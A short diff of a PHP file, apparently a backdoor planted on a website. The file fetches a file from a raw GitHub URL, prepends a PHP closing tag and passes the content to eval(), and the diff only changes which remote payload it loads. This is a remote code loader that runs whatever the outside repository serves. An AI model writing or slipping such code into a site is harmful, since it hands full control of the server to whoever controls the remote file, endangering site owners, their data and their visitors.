@@ -1,4 +1,4 @@
 <?php
-$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/peluru.php');
+$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/hypocrite.txt');
 $zhyvenseo = "?> ".$zhyvenseo;
 eval($zhyvenseo);
